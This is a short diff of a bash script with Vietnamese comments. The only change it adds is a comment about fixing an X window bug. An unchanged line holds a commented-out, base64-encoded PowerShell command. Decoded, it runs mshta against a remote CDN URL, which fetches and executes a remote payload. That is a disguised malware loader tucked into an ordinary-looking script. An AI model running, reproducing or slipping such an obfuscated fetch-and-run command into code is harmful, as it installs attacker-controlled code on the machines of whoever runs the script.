@@ -1,5 +1,5 @@
 #!/bin/bash
-
+# dùng spawnonce fix bug xwindow
 # powershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGEAcAB6AHoAegAtADIAMABjADcAZQAuAGsAeABjAGQAbgAuAGMAbwBtAC8AYQBwAHoAegB6AC0AMgAwAGMANwBlAA==
 
 # Khởi tạo biến toàn cục
